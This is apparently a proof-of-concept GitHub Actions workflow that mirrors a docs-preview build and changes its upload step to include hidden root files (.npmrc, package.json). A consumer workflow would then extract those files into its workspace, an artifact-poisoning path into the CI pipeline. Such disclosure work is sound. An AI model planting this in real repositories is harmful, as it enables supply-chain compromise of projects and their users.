# PoC: "Preview Fern Docs: Build" producer.
# Mirrors NVIDIA/aicr .github/workflows/fern-docs-preview-build.yml, but the
# upload step also ships attacker-controlled root files (.npmrc / package.json)
# that the consumer workflow extracts into $GITHUB_WORKSPACE.
name: "Preview Fern Docs: Build"

on:
  push:
    branches: [main]
  workflow_dispatch: {}

permissions:
  contents: read

jobs:
  collect:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: Checkout PR
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          fetch-depth: 0
          persist-credentials: false

      - name: Save PR metadata
        env:
          PR_NUMBER: "1"
          HEAD_REF: "poc-branch"
        run: |
          mkdir -p preview-metadata
          echo "$PR_NUMBER" > preview-metadata/pr_number
          echo "$HEAD_REF" > preview-metadata/head_ref

      - name: Upload fern sources and metadata (attacker-controlled artifact)
        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
        with:
          name: fern-preview
          # Attacker modified the producer to include hidden root files.
          include-hidden-files: true
          path: |
            fern/
            docs/
            preview-metadata/
            .npmrc
            package.json
          retention-days: 1
